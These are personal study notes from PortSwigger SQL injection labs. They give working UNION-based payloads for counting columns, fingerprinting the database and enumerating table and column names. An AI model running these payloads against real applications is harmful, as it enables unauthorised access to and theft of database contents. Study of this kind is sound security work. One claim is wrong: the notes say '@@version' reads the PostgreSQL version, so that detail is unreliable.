# TIL: SQL Injection Enumeration Tricks

> Personal notes from grinding SQLi labs on PortSwigger Web Security Academy.
> Not a full write-up, just the tricks that actually saved my time during enumeration.

---

## 1. Finding the Number of Columns

**ORDER BY method** — crank the number up until it breaks:
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--   -- if this errors (500), the query only has 2 columns
```

**UNION SELECT NULL method** — alternative, stack NULLs one by one:
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

---

## 2. Finding Which Column Accepts Strings

Once you know the column count, test each one to see which accepts text
(integer columns will throw an error if you inject a string):
```sql
' UNION SELECT 'a',NULL--
' UNION SELECT NULL,'a'--
```

---

## 3. Fingerprinting the DBMS

| DBMS | Tell |
|---|---|
| MySQL | Supports `#` as comment (besides `--`), uses `CONCAT()` for string concat |
| MSSQL | Supports stacked queries (`;`), can query `@@version` |
| Oracle | **Must** use `FROM DUAL` — Oracle can't `SELECT` without a `FROM` |
| PostgreSQL | Supports `||` for string concat, has a full `information_schema` |

Oracle payload example:
```sql
' UNION SELECT 'text', NULL FROM DUAL--
```

Grab the DB version (MySQL/MSSQL/PostgreSQL):
```sql
' UNION SELECT @@version, NULL--
```

---

## 4. Enumerating Table Names (Filter to Public Schema)

The problem: `information_schema.tables` is packed with junk — internal
system tables (`pg_*`, `sql_*`, etc.) that bury the one table you actually
care about.

**Fix:** filter with `table_schema='public'`
```sql
' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema='public'--
```

> ⚠️ Watch the spelling: `table_schema`, not `table_schama` (easy typo to make).

---

## 5. Enumerating Columns from a Specific Table

Once you've got your target table (e.g. `users_hybzgg`):
```sql
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_hybzgg'--
```

**One-shot shortcut:** grab table + column names in a single query using
`LIKE`, no need for two separate steps:
```sql
' UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_name LIKE '%user%'--
```

---

## Reference

For the full payload set per-DBMS (blind, time-based, error-based, etc.),
check out the [PortSwigger SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
— this file is just my own "I actually get it now" version from hands-on practice.
